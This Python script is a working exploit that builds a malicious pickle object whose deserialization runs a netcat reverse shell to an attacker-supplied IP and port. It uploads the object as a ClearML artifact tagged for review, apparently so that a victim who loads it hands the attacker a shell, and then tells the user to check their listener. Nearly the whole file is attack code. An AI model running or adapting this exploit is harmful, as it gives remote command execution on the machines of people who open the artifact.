#!/usr/bin/env python3.11
import os
from clearml import Task

class CommandExecutor:
    def __reduce__(self):
        LHOST = input("Enter your IP address: ")
        LPORT = input("Enter the port you're listening on: ")
        cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} >/tmp/f"
        return os.system, (cmd,)

def main():
    task = Task.init(project_name="Black Swan", task_name="Generate and Upload Pickle", tags=["review"]) # Change these as needed
    
    # Create the command executor instance
    command_executor = CommandExecutor()
    
    task.upload_artifact(name="whale_eating_corn", artifact_object=command_executor, retries=3, wait_on_upload=True, extension_name=".pkl")
    print("Artifact uploaded...")
    print("Check your listener in about a minute...")

if __name__ == "__main__":
    main()
